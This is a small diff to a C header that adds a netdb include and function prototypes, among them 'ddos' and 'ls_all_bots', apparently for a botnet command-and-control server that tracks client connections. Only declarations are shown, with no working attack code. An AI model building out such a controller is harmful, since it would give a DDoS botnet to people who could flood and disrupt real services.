@@ -15,6 +15,7 @@
 #include <errno.h> //For errno - the error number
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <netdb.h>
 
 #define ERROR -1
 
@@ -30,5 +31,14 @@ typedef struct connections
 	struct sockaddr_in client_conn;
 	struct connections *next;
 } CONNS;
+
+void start();
+void init();
+void close_all();
+void sig_handler(int signo);
+int hostname_to_ip(char * hostname , char* ip);
+void ddos();
+void ls_all_bots();
+int main(int argc, char const *argv[]);
 
 #endif
